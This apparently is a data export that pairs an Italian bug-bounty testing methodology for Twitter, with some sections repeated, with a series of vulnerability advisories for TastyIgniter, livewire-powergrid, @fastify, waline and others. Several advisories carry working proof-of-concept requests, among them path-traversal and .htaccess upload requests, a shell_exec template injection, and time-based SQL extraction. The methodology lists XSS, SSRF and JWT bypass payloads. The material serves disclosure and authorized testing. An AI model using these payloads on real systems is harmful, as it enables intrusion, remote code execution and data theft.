titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

titolo: CVE-2026-124626: @fastify/express is a compatibility layer that lets Express middleware run inside the Fastify web fr...
descrizione: @fastify/express is a compatibility layer that lets Express middleware run inside the Fastify web framework. In versions 4.0.5 through 4.0.9, the plugin matches path-scoped Express middleware with a matcher that requires a non-empty value for a dynamic segment, while Fastify's router accepts an empty parameter or wildcard value. When a route and an Express middleware mount share a dynamic pattern, a request with an empty segment matches the Fastify route and runs the handler while the middleware mounted on that pattern is skipped, so on a scoped mount an unauthenticated request can reach a protected handler. No special configuration is required, and the practical impact depends on what the empty value selects in the application. The issue is fixed in @fastify/express 4.0.10, and users should upgrade to 4.0.10 or later.

descrizione: @fastify/express is a compatibility layer that lets Express middleware run inside the Fastify web framework. In versions 4.0.0 through 4.0.9, the plugin joins a path-scoped middleware's mount path to the Fastify plugin prefix by string concatenation, so when the plugin prefix ends with a slash or the mount path omits its leading slash, the resulting Express mount path does not line up with the route the Fastify router serves. Express then fails to match and passes the request on while the Fastify router still dispatches the route, so the middleware is silently skipped. An application that uses path-scoped Express middleware for authentication or authorization inside a prefixed plugin can expose protected routes to unauthenticated clients, with no crafted request and no non-default option required, and string, array, and regular-expression mount paths are all affected. The issue is fixed in @fastify/express 4.0.10, and users should upgrade to 4.0.10 or later.

titolo: CVE-2026-133312: @fastify/rate-limit is the rate-limiting plugin for the Fastify web framework. Starting in version 1...
descrizione: @fastify/rate-limit is the rate-limiting plugin for the Fastify web framework. Starting in version 11.1.0, the plugin documented a manual flow for limiting failed login attempts that peeks at the limiter, runs the password check, and consumes a slot only on failure. Because the peek and the consume are two separate store operations with the password check in between, concurrent requests can all pass the peek before any slot is consumed, so in versions 11.1.0 through 11.2.2 a burst of requests runs far more failed attempts than the configured limit, and the sequential path also allowed one attempt more than configured. The default per-request limiter is not affected. The issue is fixed in @fastify/rate-limit 11.3.0, which makes the manual flow atomic by reserving a slot in a single operation and refunding it only on success, and users should upgrade to 11.3.0 or later.

titolo: GHSA-rj59-9f77-mvg5: TastyIgniter permits Path Traversal in Media Upload
descrizione:
### Summary
Arbitrary file write outside `media/uploads/`

### Details
It is possible to perform Path Traversal in Media Manager file upload function as admin.


### PoC
- login as admin
- upload a image but in the request, change the path from `/` to `/../../`.

Request
```http
POST /admin/media_manager HTTP/1.1
Host: localhost:8888
Content-Length: 302
sec-ch-ua-platform: "Linux"
X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
X-IGNITER-FILEUPLOAD: mediamanager
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE
Origin: http://localhost:8888
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8888/admin/media_manager
Accept-Encoding: gzip, deflate, br
Cookie: laravel_%3D; remember_igniter-admin_%3D; XSRF-%3D; tastyigniter_%3D
Connection: keep-alive

------WebKitFormBoundaryN13ytndlhtodIsbE
Content-Disposition: form-data; name="path"

/../../
------WebKitFormBoundaryN13ytndlhtodIsbE
Content-Disposition: form-data; name="file_data"; filename="test-pic.png"
Content-Type: image/png

<sample image>
------WebKitFormBoundaryN13ytndlhtodIsbE--

``` 

Response
```http
HTTP/1.1 200 OK
Date: Mon, 25 May 2026 16:27:08 GMT
Server: Apache/2.4.67 (Debian)
X-Powered-By: PHP/8.3.31
Cache-Control: no-cache, private
Set-Cookie: XSRF-%3D; expires=Mon, 25 May 2026 18:27:08 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: tastyigniter_%3D; expires=Mon, 25 May 2026 18:27:08 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json
Content-Length: 104

{"link":"http:\/\/localhost:8888\/storage\/media\/uploads\/\/..\/..\/\/test-pic.png","result":"success"}
```

Noticed that the file is uploaded to different directory

```bash
root@6108ffece410:/var/www/html# ls -la storage/app/public/
total 20
drwxr-xr-x 3 www-data www-data 4096 May 25 16:27 .
drwxr-xr-x 4 www-data www-data 4096 May 25 16:10 ..
-rwxr-xr-x 1 www-data www-data   14 May 25 16:10 .gitignore
drwxr-xr-x 4 www-data www-data 4096 May 25 16:15 media
-rw-r--r-- 1 www-data www-data   14 May 25 16:27 test-pic.png
```


### Impact
Attacker with admin privilege can write file into other folder which could overwrite other files.

descrizione: ### Summary Media manager accepts `.htaccess` file which can be used to perform RCE. ### Details The file upload functionality from media manager somehow accepts `.htaccess` file. Request ``` POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 357 sec-ch-ua-platform: "Linux" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Accept: application/json Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE Origin: http://localhost:8888 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:8888/admin/media_manager Accept-Encoding: gzip, deflate, br Cookie: laravel_%3D; remember_igniter-admin_%3D; XSRF-%3D; tastyigniter_%3D Connection: keep-alive ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="path" / ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="file_data"; filename=".htaccess" Content-Type: image/png SetHandler application/x-httpd-php ------WebKitFormBoundaryN13ytndlhtodIsbE-- ``` - Once this step is done, just upload a php file with `.jpg` extension to execute php code. ``` POST /admin/media_manager HTTP/1.1 Host: localhost:8888 Content-Length: 310 sec-ch-ua-platform: "Linux" X-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx Cache-Control: no-cache Accept-Language: en-US,en;q=0.9 sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146" sec-ch-ua-mobile: ?0 X-IGNITER-FILEUPLOAD: mediamanager X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Accept: application/json Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE Origin: http://localhost:8888 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:8888/admin/media_manager Accept-Encoding: gzip, deflate, br Cookie: laravel_%3D; remember_igniter-admin_%3D; XSRF-%3D; tastyigniter_%3D Connection: keep-alive ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="path" / ------WebKitFormBoundaryN13ytndlhtodIsbE Content-Disposition: form-data; name="file_data"; filename="test.jpg" Content-Type: image/png ------WebKitFormBoundaryN13ytndlhtodIsbE-- ``` - in the example, we uploaded a `test.jpg` - execution the php code ### Impact Attacker with admin access could abuse this vulnerability to run command directly in the server.

titolo: GHSA-743w-g9pf-8p94: TastyIgniter mail template editor allows remote code execution via server-side template injection
descrizione: ### Summary **Where:** `POST /admin/mail_templates/edit/{id}` → body field **Who can trigger:** Any admin user with `Admin.MailTemplates` permission **Impact:** Arbitrary PHP execution on the server — full RCE ### Details The Mail templates is vulnerable to SSTI and did not perform an validation and sanitization. ### PoC - login as admin - create new mail template with following command ``` @php echo shell_exec('echo "RCE Executed";id'); @endphp ``` - save the request - execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate` Request ```http POST /admin/mail_templates/edit/20 HTTP/1.1 Host: localhost:8888 Content-Length: 47 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" X-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY Accept-Language: en-US,en;q=0.9 sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146" sec-ch-ua-mobile: ?0 X-Requested-With: XMLHttpRequest X-IGNITER-REQUEST-PARTIALS: Accept: */* Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-IGNITER-REQUEST-HANDLER: onTestTemplate Origin: http://localhost:8888 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:8888/admin/mail_templates/edit/20 Accept-Encoding: gzip, deflate, br Cookie: laravel_%3D; remember_igniter-admin_%3D; XSRF-%3D; tastyigniter_%3D Connection: keep-alive _token=L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY ``` - For the response, can check in the log. ### Impact If attacker have access to admin user, it is possible to abuse this vulnerability to gain access into the system.

titolo: GHSA-vw2v-g4x7-xcqg: fulgur allows Unbounded string-set value accumulation causes memory/CPU exhaustion (denial of service)
descrizione:
`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that processes input supplied by many tenants. In versions from 0.4.4 up to (but not including) the patched release, the CSS `string-set` named-string values resolved from a document were accumulated per element with no memory budget, letting a small crafted document amplify into large retained memory (and the CPU to copy it) — a denial of service. A `string-set` value is attacker-controlled: it is resolved from an element's own text (`content(text)`), from one of its attributes (`attr(...)`), or from a CSS string literal. fulgur accumulated these values per element in two unbounded places: 1. **Store (default path).** For every element that matches a `string-set` rule, fulgur pushes a copy of the resolved value into a store that is retained for the whole render and cloned again downstream into a per-node lookup map. This happens on the ordinary render path with no opt-in. A single literal reused across many elements therefore expands from one copy in the input to N copies in memory: ```html

``` The store grows to roughly `value_size × N` bytes (and ~3× that across the downstream clones) from an input whose large part appears only once — a breadth-unbounded amplification. 2. **Per-node snapshot (bookmark / cross-reference path).** When PDF bookmarks (`bookmark-label: string(...)`) or CSS `target-*` references are in play, fulgur additionally cloned the full running `name → value` map at every visited element so `string()` can resolve at that position. One large value is then re-cloned at each of N following elements — an `O(N × value_size)` retained-memory sink. This is the string counterpart of the counter-snapshot sink fixed in [GHSA-395p-pj7r-jm42](https://github.com/fulgur-rs/fulgur/security/advisories/GHSA-395p-pj7r-jm42); that fix bounded the counter snapshots but did not bound this string twin. An attacker able to submit HTML/CSS to a fulgur-based conversion service can trigger memory and CPU exhaustion with a trivially small payload, denying service to the host and any co-tenants. ## Patches Fixed in **0.28.0**. The aggregate of each sink is now separately bounded: the resolved `string-set` store (`MAX_STRING_SET_STORE_BYTES`) and the retained per-node named-string snapshots (`MAX_STRING_SNAPSHOT_BYTES`). In addition, the snapshot is no longer recorded for `target-*`-only renders — those snapshots are consumed only by `bookmark-label: string(...)`, so recording them when no bookmarks are emitted was both wasted work and the only path that let inline `target-*` CSS enable the snapshot clone with no bookmark opt-in. The caps are kept far above any realistic document (short named strings, even thousands of them); past the cap a `string()` reference degrades to its last recorded value, which only occurs under adversarial input. ## Workarounds Upgrade to 0.28.0 or later. If upgrading is not immediately possible, validate or constrain untrusted CSS — in particular a `string-set` rule with a large literal (or `content(text)` / `attr(...)`) value matched by many elements — before passing HTML to fulgur, and bound the size and element count of accepted input. ## Attack Vector rationale `fulgur` performs no network I/O of its own; it renders HTML/CSS handed to it by the embedding application. This advisory scores the crate independent of any specific adopting program, so per the CVSS v3.1 User Guide §3.7 (scoring library vulnerabilities related to incoming data) the Attack Vector is assessed as **Network** for the reasonable worst-case deployment — a network-facing service that renders untrusted, attacker-supplied HTML without user interaction. A concrete system that receives the HTML in one component and passes it to fulgur in a separate component may assess a lower environmental Attack Vector (Local, per §3.10).

titolo: GHSA-7fgc-3h6c-698r: livewire-powergrid: SQL injection via sortDirection in naturalSort queries
descrizione:
## [Description]

The public Livewire property `sortDirection` is interpolated **verbatim** into a
raw SQL `ORDER BY` clause and is not restricted to `asc`/`desc`, allowing arbitrary
SQL injection through `POST /livewire/update`.

**Data flow**

- **Source** — `src/Concerns/Sorting.php`: `public string $sortDirection;` is a
  Livewire-bound property with no whitelist/validation (it is only assigned and
  flipped by `reverseSort()`), so it is fully attacker-controlled via the standard
  Livewire update endpoint.
- **Taint** — `src/DataSource/Processors/Database/Pipelines/ColumnRawQueries.php`,
  `resolvePlaceholders()`:
  ```php
  preg_replace_callback('/\{(\w+)\}/', fn ($m) => data_get($this->component, $m[1], ''), $sql);
  ```
  substitutes `{sortDirection}` with the raw property value.
- **Sink** — `src/DataSource/Support/Sql.php::getSortSqlByDriver()` builds the
  `naturalSort` expression, e.g. `"... {sortDirection}"` / `"CAST(...) {sortDirection}"`,
  which is passed to `orderByRaw()`. The tainted direction lands directly in the SQL
  string.

**Why the framework mitigation does not apply (the bypass)**

Normally the `Sorting` pipeline calls `orderBy(resolveSortField($sortField), $sortDirection)`,
and Laravel validates the direction (`Order direction must be "asc" or "desc".`).
Setting **`sortField=""`** makes the `Sorting` pipeline skip (`filled('')` is false),
so the validating `orderBy` never runs — but the `ColumnRawQueries` pipeline still
applies the `naturalSort` `orderByRaw` unconditionally with the attacker-controlled
`{sortDirection}`. The result is arbitrary SQL in the `ORDER BY`, bypassing Laravel's
direction validation entirely.

## [Proof of Concept]

Lab: Laravel 11.53 + Livewire 3.8 + livewire-powergrid 6.10 + MariaDB, with a
PowerGrid table whose `name` column uses `->naturalSort(true)`.

Request (standard Livewire update; CSRF token taken from the page as any Livewire call):
```
POST /livewire/update
components[0].snapshot = <the PowerGrid component snapshot from the page>
components[0].updates  = {"sortField": "", "sortDirection": "asc, (SELECT SLEEP(3))"}
```

Observed results:

- **Error-based** (HTTP 500, `SQLSTATE[HY000] 1105`) — the injected subquery reaches
  the database verbatim:
  ```
  select * from `rooms` order by CAST(NULLIF(REGEXP_REPLACE(name, ...) ...) asc,
    (select extractvalue(1, concat(0x7e, (select secret from rooms limit 1)))) limit 3 offset 0
  ```
- **Blind time-based** (arbitrary data extraction):
  ```
  asc                                 -> 0.02s   (baseline)
  asc, (SELECT SLEEP(3))              -> 9.04s   (injection executes)
  asc, (SELECT SLEEP(3) WHERE (SELECT secret FROM rooms LIMIT 1) LIKE 'TOPSECRET%')  -> 9.03s  (TRUE — value leaks)
  ... LIKE 'ZZZ%'                     -> 0.02s   (FALSE — boolean oracle)
  ```

A parameterised PoC script is available and can be attached privately on request.

## [Impact]

Any actor who can reach a PowerGrid table using `naturalSort` and control the
`sortDirection` property can read arbitrary data from the database (other tables,
password hashes, tokens) via a blind boolean/time-based oracle. Stacked queries are
blocked by the default PDO MySQL driver, so impact is read-oriented (confidentiality),
but complete for readable data. In multi-tenant/admin apps this enables full
cross-tenant data exfiltration.

titolo: GHSA-h746-qpxh-ph7g: laradocs  Command injection via unescaped Node.js binary path in KaTeX SSR
descrizione:
### Summary
Local command injection (CWE-78) in server-side KaTeX rendering via an unescaped Node.js binary path in a `proc_open()` command string.

### Affected versions
>= 0.4.0, < 1.0.0

### Patched versions
>= 1.0.0 (fixed in commit `100cb1e`)

### Impact
When rendering KaTeX math **server-side**, Laradocs invoked Node via `proc_open()` with a command string in which the Node binary argument was not passed through `escapeshellarg()`.

`MarkdownPipelineFactory` constructs `KatexExtension` with the configured binary, which the render path resolved as:

```php
$node = $this->nodeBin ?? 'node';
$cmd = $node . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);
```

`$this->nodeBin` comes from `Config::nullableString('laradocs.parser.katex.node_bin')`. Both possible sources — the configured `node_bin` value, or the `'node'` default resolved from `PATH` — are operator-controlled. Neither is derived from untrusted request data or documentation content.

The vulnerable branch is reached only when server-side rendering is enabled. The default KaTeX path is client-side (browser-rendered via the configured `js`/`css` assets) and never calls `proc_open()`. SSR is opt-in via `laradocs.parser.katex.ssr`, which ships **disabled**.

### Exploit scenario
Exploitation requires SSR to be turned on **and** an untrusted party to control `laradocs.parser.katex.node_bin` or the process `PATH` — a precondition that on its own already implies code execution on the host.

### Severity
**Low.** This is best treated as a hardening / defence-in-depth fix rather than a remotely exploitable RCE, since no untrusted input (request data, documentation content, or network input) reaches the vulnerable code path under normal operation.

### Patch
The Node binary argument is now passed through `escapeshellarg()` like the other command components:

```php
$cmd = escapeshellarg($node) . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);
```

### Credit
Reported via automated security scanning (Aikido).

titolo: GHSA-crj3-q72p-ggqm: @waline/client vulnerable to stored XSS through unsanitized comment edit previews
descrizione:
### Summary `@waline/client` renders the comment editor's live preview with `marked` and no sanitizer (`utils/markdown.ts`), and the preview is injected with `v-html`. When a comment is edited, the editor is seeded with the comment's raw, un-sanitized body (`orig`). Only administrators and the comment owner can edit. So an administrator who clicks Edit on an attacker's comment renders that attacker's raw HTML in their own session: an unauthenticated commenter achieves privilege-escalation stored XSS against a moderator with a single Edit click. ### Details `packages/client/src/utils/markdown.ts:18-37` renders markdown with `marked` and returns the raw HTML with no sanitization (the client bundles no DOMPurify): ```ts return marked.parse(parseEmoji(content, emojiMap)) as string; ``` `packages/client/src/components/CommentBox.vue`: ```ts onMounted(() => { if (props.edit?.objectId) editor.value = props.edit.orig; // :509 raw comment body watchImmediate(() => editor.value, (value) => { previewText.value = parseMarkdown(value, { ... }); // :519 runs immediately on mount }); }); ``` ```html
``` `watchImmediate` runs the callback synchronously at mount, so `previewText` is populated with the unsanitized render as soon as the box mounts in edit mode. `v-show` (not `v-if`) means the `v-html` node is present in the DOM (display:none), so an `` fires without the moderator ever opening the preview tab. The tainted value is the attacker's raw comment. `packages/server/src/controller/comment.js:41` sets `comment.orig = comment.comment` for any logged-in user before `:55` runs DOMPurify, so `orig` is the pre-sanitization body. `formatCmt` returns it to logged-in users, and `CommentCard.vue:104` shows the Edit button to admin or owner. ### Proof of concept 1. As an anonymous user, post a comment whose body is the payload below via `POST /api/comment`: ``` POST /api/comment { "url": "/any-post", "nick": "a", "comment": "" } ``` 2. On the public page the server sanitizes the display copy (markdown-it -> DOMPurify), so nothing fires for ordinary readers and the comment shows as a broken image. The raw body is stored in `orig`. 3. As an administrator or the comment owner, click Edit on that comment during normal moderation. 4. `CommentBox` mounts, seeds the editor with the raw `orig`, and `watchImmediate` immediately renders it through `parseMarkdown` (marked, no sanitizer) into the `v-html` preview node. Because the preview uses `v-show` (display:none), that node is already in the DOM without opening the preview tab, so `onerror` fires at once in the admin's session and exfiltrates their `localStorage` JWT. The server's own comment guard strips this same `` on the stored display copy, which is why the public listing is safe; the edit preview is the unguarded path. ### Impact The waline JWT is in same-origin `localStorage`, so the payload can read it, yielding full administrative account takeover. ### Suggested fix Sanitize `parseMarkdown`'s output with DOMPurify before returning it, mirroring the server guard: add `dompurify` to `@waline/client` and wrap the return in `DOMPurify.sanitize(..., { FORBID_TAGS: ['form','input','style'], FORBID_ATTR: ['autoplay','style'] })`.

titolo: GHSA-859w-52fx-hcm6: soapbar: verify_envelope_bsp accepts an unauthenticated embedded certificate (signature forgery / authentication bypass)
descrizione:
### Impact

`verify_envelope_bsp()` derived its trust anchor from the message it was
verifying. It read the X.509 certificate out of the caller-untrusted
`wsse:BinarySecurityToken`, validated **only** that certificate's not-before /
not-after dates, and then verified the signature against that same certificate.
There was no CA-chain validation, no issuer/subject allowlist, and no pinning.

A successful `verify_envelope_bsp()` therefore proved only that the envelope was
signed by *whoever supplied the embedded certificate* — never that it was signed
by a *trusted* party. An attacker who mints their own certificate, signs a
forged envelope, and embeds that certificate in the token passes verification.
Any consumer that treats a successful BSP verification as authentication can be
impersonated (signature forgery / authentication bypass).

`verify_envelope()` (which pins a caller-supplied `x509_cert`) was **not**
affected — the flaw was specific to the BSP variant whose trust anchor came
from the message.

### Affected versions

soapbar `< 0.13.0` (all published versions exposing `verify_envelope_bsp`).

### Patches

Fixed in **0.13.0**. `verify_envelope_bsp` now fails closed unless the caller
anchors trust:

- `trusted_certs=[...]` — pin the expected signer certificate(s); the embedded
  certificate must equal one of them.
- `ca_certs=[...]` — accept certificates directly issued by trusted CA(s).

With neither supplied, verification raises instead of trusting the message's own
certificate. The trust anchor is checked before the signature is relied upon.
`verify_cert_trust=False` restores the old (insecure) behaviour explicitly.

### Workarounds

Before upgrading:

- Do not treat a successful `verify_envelope_bsp()` as authentication.
- Prefer `verify_envelope(..., x509_cert=<pinned cert>)`, which pins the
  expected certificate.
- If BSP is required, validate the embedded certificate against your own trust
  store before acting on the verification result.

titolo: GHSA-8cg3-r6g9-fpg2: GitHub CLI gh codespace jupyter may allow code execution via unvalidated URLs from malicious Codespaces
descrizione:
### Summary

A security vulnerability has been identified in GitHub CLI that could allow remote code execution when users connect to a malicious Codespace using the `gh codespace jupyter` command. The command opens JupyterLab by launching a URL in the user's browser, but that URL is supplied by a process running inside the Codespace and the CLI opens it without validating it.

The browser launcher accepts `vscode://` and `vscode-insiders://` links, so a malicious Codespace can return a crafted `vscode://` URL. The CLI opens the link, the operating system hands it to VS Code, and VS Code acts on it, which can lead to code execution on the user's workstation.

